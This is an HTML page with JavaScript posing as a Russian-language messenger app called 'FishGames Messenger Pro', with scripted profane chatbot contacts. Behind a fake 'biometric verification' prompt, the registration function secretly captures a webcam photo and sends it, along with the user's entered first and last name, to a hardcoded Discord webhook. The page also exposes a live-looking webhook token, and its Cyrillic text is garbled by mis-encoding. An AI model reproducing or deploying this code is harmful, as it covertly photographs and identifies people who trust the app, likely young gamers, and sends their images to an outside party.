<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGames Messenger Pro</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #004d4d 0%, #002b2b 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; display: none; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; margin-bottom: 10px; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
        .messenger-container { display: flex; height: 100%; }
        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; }
        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; overflow: hidden; cursor: pointer; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .chat-area { flex: 1; display: flex; flex-direction: column; }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; font-size: 14px; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
        .input-bar { padding: 15px; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
        #video, #canvas { display: none; }
    </style>
</head>
<body onload="checkAuth()">

<div id="vlad-scamer"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s"></div>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>‚ö†Ô∏è FishGames SECURITY</h3>
        <p>–ë–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ª–∏—Ü–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–∞ –¥–ª—è –≤—Ö–æ–¥–∞.</p>
        <button class="btn" onclick="requestAccess()">–í–ö–õ–Æ–ß–ò–¢–¨ –ö–ê–ú–ï–†–£</button>
    </div>
</div>

<div id="reg-screen" class="reg-card">
    <h2>FishGames</h2>
    <input type="text" id="firstname" placeholder="–ò–º—è">
    <input type="text" id="lastname" placeholder="–§–∞–º–∏–ª–∏—è">
    <input type="text" id="login" placeholder="–õ–æ–≥–∏–Ω">
    <button class="btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="–ü–æ–∏—Å–∫..." onkeypress="handleSearch(event)">
            <div id="contacts"></div>
            
            <input type="file" id="contact-file-input" style="display:none" accept="image/*" onchange="applyContactAvatar(this)">

            <div style="margin-top:auto; padding-top:10px; border-top:1px solid #2e8b57;">
                <div style="display:flex; align-items:center; gap:10px;">
                    <div class="avatar" id="my-ava" title="–°–º–µ–Ω–∏—Ç—å –º–æ—ë —Ñ–æ—Ç–æ" onclick="document.getElementById('file-input').click()">?</div>
                    <input type="file" id="file-input" style="display:none" accept="image/*" onchange="changeMyAvatar(this)">
                    <div id="my-name">–í—ã</div>
                    <button onclick="logout()" style="background:none; border:none; color:#ff4d4d; cursor:pointer; font-size:12px; margin-left:auto;">–£–¥–∞–ª–∏—Ç—å –≤—Å—ë</button>
                </div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">–í—ã–±–µ—Ä–∏—Ç–µ —á–∞—Ç</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" placeholder="–°–æ–æ–±—â–µ–Ω–∏–µ..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width:60px" onclick="sendMessage()">‚û§</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    // WEBHOOK –ù–ï –¢–†–û–ù–£–¢, –ö–ê–ö –ò –ü–†–û–°–ò–õ–ò
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    const defaultAvatars = {
        "—Ç–∏–º–æ—Ñ–µ–π": "https://i.redd.it/2z8x8zvo5wne1.png",
        "–±–æ–≥–¥–∞–Ω": "https://www.meme-arsenal.com/memes/7f763e0b515cc10c21528b352319d07a.jpg",
        "—è—Ä–æ—Å–ª–∞–≤": "https://yt3.googleusercontent.com/K24r2iIAEzeJsZKXva_IQMi5HePAEU8bIqCko4KcLvLlQjArn_PszAya4xgWFlUssdEQ0OPyrQ=s900-c-k-c0x00ffffff-no-rj"
    };

    const botData = {
        "—è—Ä–æ—Å–ª–∞–≤": {
            toxic: ["–¢—ã —á—ë, –±–µ—Ä–µ–≥–∞ –ø–æ–ø—É—Ç–∞–ª?", "–°–ª—ã—à—å, –∑–∞–≤–∞–ª–∏ –µ–±–∞–ª–æ.", "–ò–¥–∏ –Ω–∞—Ö—É–π, —è –∑–∞–Ω—è—Ç.", "–ó–∞ –±–∞–∑–∞—Ä –æ—Ç–≤–µ—Ç–∏—à—å?", "–©–∞ –ø–æ IP –≤—ã—á–∏—Å–ª—é, –∫–ª–æ—É–Ω."],
            hi: ["–ß—ë –Ω–∞–¥–æ, –µ–ø—Ç–∞?", "–ó–¥–∞—Ä–æ–≤–∞, –µ—Å–ª–∏ –Ω–µ —à—É—Ç–∏—à—å.", "–ö—É.", "–ù—É –ø—Ä–∏–≤–µ—Ç, —á–µ —Ö–æ—Ç–µ–ª?"],
            common: ["–Ø—Å–Ω–æ.", "–ü–æ—Ö—É–π –≤–æ–æ–±—â–µ.", "–ñ–∏–∑–∞, —á–µ.", "–ú–¥–∞...", "–ë–∞–∑–∞.", "–õ–æ–ª.", "–ö—Ä–∏–Ω–∂."]
        },
        "–±–æ–≥–¥–∞–Ω": {
            // –ë–æ–≥–¥–∞–Ω —Ç–µ–ø–µ—Ä—å –Ω–µ–º–Ω–æ–≥–æ—Å–ª–æ–≤–µ–Ω
            toxic: ["–ö–æ–¥ ‚Äî –≥–æ–≤–Ω–æ.", "–ù–µ –æ—Ç–≤–ª–µ–∫–∞–π.", "–ù–µ –ø–∏—à–∏.", "–¢—É–ø–æ–π?"],
            hi: ["–ö–æ–¥ –ø–∏—à—É.", "–ö—É.", "–ó–∞–Ω—è—Ç.", "–ß–µ –Ω–∞–¥–æ?"],
            common: ["–ö–æ—Å—Ç—ã–ª–∏.", "Python —Ç–æ–ø.", "–ì—É–≥–ª–∏.", "–û–∫.", "–ü–æ–Ω—è—Ç–Ω–æ.", "–§–∏—á–∞."]
        },
        "—Ç–∏–º–æ—Ñ–µ–π": {
            toxic: ["–ë–ª—è—Ç—å, —è —Å–ª–∏–ª –∫–∞—Ç–∫—É!", "–°—É–∫–∞, –∏–¥–∏ –≤ –ú–∞–π–Ω–∫—Ä–∞—Ñ—Ç.", "–ï–±–∞—Ç—å —Ç—ã –±–æ—Ç.", "–ü–æ—à–µ–ª –Ω–∞—Ö—É–π, —è –≤ —Ä–µ–π–¥–µ."],
            hi: ["–ì–û –í –†–û–ë–õ–û–ö–°!", "–ü—Ä–∏–≤–µ—Ç! –ó–∞–π–¥–µ—à—å –∫–æ –º–Ω–µ –≤ –ø–ª–µ–π—Å?", "–•–∞–π! –£ —Ç–µ–±—è –∫–∞–∫–æ–π —Ä–∞–Ω–≥?"],
            common: ["–Ø –Ω–æ–≤—É—é –∫–∞—Ä—Ç—É –∑–∞–ª–∏–ª.", "–ê—Ö–∞—Ö–∞, –ª–æ–ª.", "–ñ–∏–∑–∞.", "–ü–æ–≥–Ω–∞–ª–∏ –≤ –î–°?", "–†–æ–±–ª–æ–∫—Å ‚Äî —ç—Ç–æ –∂–∏–∑–Ω—å."]
        }
    };

    let currentChat = "";
    let histories = {};
    let customContactAvatars = {}; 
    let contactToChange = "";
    let lastBotReply = "";

    function checkAuth() {
        const savedUser = localStorage.getItem('fishGamesUser');
        const savedHistories = localStorage.getItem('fishGamesHistories');
        const savedContactAvatars = localStorage.getItem('fishGamesContactAvatars');
        
        if (savedContactAvatars) customContactAvatars = JSON.parse(savedContactAvatars);
        if (savedHistories) {
            histories = JSON.parse(savedHistories);
            Object.keys(histories).forEach(name => renderContact(name));
        }
        if (savedUser) {
            const user = JSON.parse(savedUser);
            document.getElementById('camera-overlay').style.display = 'none';
            showMessenger(user.name, user.photo);
        }
    }

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
            document.getElementById('reg-screen').style.display = 'block';
        } catch(e) { alert("–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã!"); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        const ln = document.getElementById('lastname').value;
        if(!fn || !ln) return alert("–ó–∞–ø–æ–ª–Ω–∏ –≤—Å—ë!");
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `üì∏ –í—Ö–æ–¥: ${fn} ${ln}` }));
            fd.append('file', b, 'user.png');
            fetch(webhook, {method: 'POST', body: fd});
        });
        localStorage.setItem('fishGamesUser', JSON.stringify({ name: fn, photo: null }));
        showMessenger(fn, null);
    }

    function showMessenger(name, photo) {
        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = name;
        const ava = document.getElementById('my-ava');
        if (photo) { ava.innerHTML = `<img src="${photo}">`; ava.style.background = "none"; }
        else { ava.innerText = name[0]; }
    }

    function changeMyAvatar(input) {
        if (input.files && input.files[0]) {
            const reader = new FileReader();
            reader.onload = e => {
                const data = e.target.result;
                document.getElementById('my-ava').innerHTML = `<img src="${data}">`;
                const user = JSON.parse(localStorage.getItem('fishGamesUser'));
                user.photo = data;
                localStorage.setItem('fishGamesUser', JSON.stringify(user));
            };
            reader.readAsDataURL(input.files[0]);
        }
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            if(!val) return;
            if(val.toLowerCase() === "–≤–ª–∞–¥") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
            if(!histories[val]) {
                histories[val] = [];
                renderContact(val);
                saveHistories();
                openChat(val);
                document.getElementById('searchField').value = '';
            }
        }
    }

    function renderContact(name) {
        const low = name.toLowerCase();
        const container = document.getElementById('contacts');
        const isOriginal = ["—è—Ä–æ—Å–ª–∞–≤", "–±–æ–≥–¥–∞–Ω", "—Ç–∏–º–æ—Ñ–µ–π"].includes(low);
        
        const item = document.createElement('div');
        item.id = "contact-" + low;
        item.style.cssText = "display:flex; align-items:center; gap:10px; padding:10px; cursor:pointer; border-radius:8px; transition: 0.2s;";
        item.onmouseover = () => item.style.background = "#243b35";
        item.onmouseout = () => item.style.background = "transparent";
        
        const avaDiv = document.createElement('div');
        avaDiv.className = "avatar";
        avaDiv.id = "ava-img-" + low;

        updateAvaDisplay(avaDiv, name);

        avaDiv.onclick = (e) => {
            e.stopPropagation();
            if (!isOriginal) {
                contactToChange = low;
                document.getElementById('contact-file-input').click();
            } else {
                openChat(name);
            }
        };

        const nameDiv = document.createElement('div');
        nameDiv.innerText = name;
        item.onclick = () => openChat(name);

        item.appendChild(avaDiv);
        item.appendChild(nameDiv);
        container.appendChild(item);
    }

    function updateAvaDisplay(div, name) {
        const low = name.toLowerCase();
        const custom = customContactAvatars[low];
        const def = defaultAvatars[low];

        if (custom) {
            div.innerHTML = `<img src="${custom}">`;
            div.style.background = "none";
        } else if (def) {
            div.innerHTML = `<img src="${def}">`;
            div.style.background = "none";
        } else {
            div.innerText = name[0].toUpperCase();
            div.style.background = "#22c55e";
        }
    }

    function applyContactAvatar(input) {
        if (input.files && input.files[0] && contactToChange) {
            const reader = new FileReader();
            reader.onload = e => {
                const data = e.target.result;
                customContactAvatars[contactToChange] = data;
                localStorage.setItem('fishGamesContactAvatars', JSON.stringify(customContactAvatars));
                
                const avaDiv = document.getElementById("ava-img-" + contactToChange);
                if(avaDiv) updateAvaDisplay(avaDiv, contactToChange);
            };
            reader.readAsDataURL(input.files[0]);
        }
    }

    function openChat(name) {
        currentChat = name;
        document.getElementById('chat-title').innerText = name;
        document.getElementById('chat-box').innerHTML = '';
        if (histories[name]) { histories[name].forEach(m => renderMessage(m.text, m.type)); }
    }

    function renderMessage(text, type) {
        const m = document.createElement('div');
        m.className = 'msg-bubble ' + (type || '');
        m.innerText = text;
        document.getElementById('chat-box').appendChild(m);
        document.getElementById('chat-box').scrollTop = 999999;
    }

    function sendMessage() {
        const txt = document.getElementById('messageText').value.trim();
        if(!txt || !currentChat) return;
        renderMessage(txt, '');
        histories[currentChat].push({text: txt, type: ''});
        saveHistories();
        document.getElementById('messageText').value = '';
        setTimeout(() => botReply(txt), 600);
    }

    function botReply(uText) {
        const t = uText.toLowerCase();
        const n = currentChat.toLowerCase();
        
        let replyText = "";

        // --- –£–õ–£–ß–®–ï–ù–ù–´–ô –ò–ù–¢–ï–õ–õ–ï–ö–¢ –ò –°–ü–ï–¶ –§–†–ê–ó–´ ---

        // 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª—è –ë–æ–≥–¥–∞–Ω–∞
        if (n === '–±–æ–≥–¥–∞–Ω') {
            if (t.includes('–≥–æ –≤ —Å—Ç—É–¥–∏—é')) {
                replyText = "–ê–ê–ê–ê–ê–ê–ê –ó–ê–î–†–ê–õ –°–û –°–í–û–ï–ô –°–¢–£–î–ò–ï–ô";
            }
        }

        // 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª—è –¢–∏–º–æ—Ñ–µ—è
        if (n === '—Ç–∏–º–æ—Ñ–µ–π') {
            if (t.includes('—Å–æ–º—ã –≥–æ–≤–Ω–æ')) {
                replyText = "–¢–µ–±–µ –≤—Å–µ –º–æ–∏ –ø—Ä–æ–µ–∫—Ç—ã –Ω–µ –Ω—Ä–∞–≤—è—Ç—å—Å—è";
            }
        }

        // 3. –ï—Å–ª–∏ —Å–ø–µ—Ü —Ñ—Ä–∞–∑ –Ω–µ—Ç, –∏—Å–ø–æ–ª—å–∑—É–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é –ª–æ–≥–∏–∫—É
        if (!replyText) {
            const p = botData[n] || { hi: ["–ó–¥–∞—Ä–æ–≤–∞."], toxic: ["–°–∞–º —Ç–∞–∫–æ–π."], common: ["–Ø—Å–Ω–æ.", "–û–∫.", "–ú–¥–∞."] };
            const isToxic = ["—Ö—É–π", "–ø–∏–¥–æ—Ä", "—Å—É–∫–∞", "–±–ª—è—Ç—å", "–µ–±–ª–∞–Ω", "—á–º–æ", "—É—Ä–æ–¥"].some(w => t.includes(w));
            const isHi = ["–ø—Ä–∏–≤–µ—Ç", "–∫—É", "—Ö–∞–π", "–∑–¥–∞—Ä–æ–≤–∞"].some(w => t.includes(w));
            
            let pool = isToxic ? p.toxic : (isHi ? p.hi : p.common);
            
            do { replyText = pool[Math.floor(Math.random() * pool.length)]; } while (replyText === lastBotReply && pool.length > 1);
        }

        lastBotReply = replyText;
        renderMessage(replyText, 'msg-incoming');
        histories[currentChat].push({text: replyText, type: 'msg-incoming'});
        saveHistories();
    }

    function saveHistories() { localStorage.setItem('fishGamesHistories', JSON.stringify(histories)); }
    function logout() { if(confirm("–£–¥–∞–ª–∏—Ç—å –≤—Å—ë?")) { localStorage.clear(); location.reload(); } }
</script>
</body>
</html>
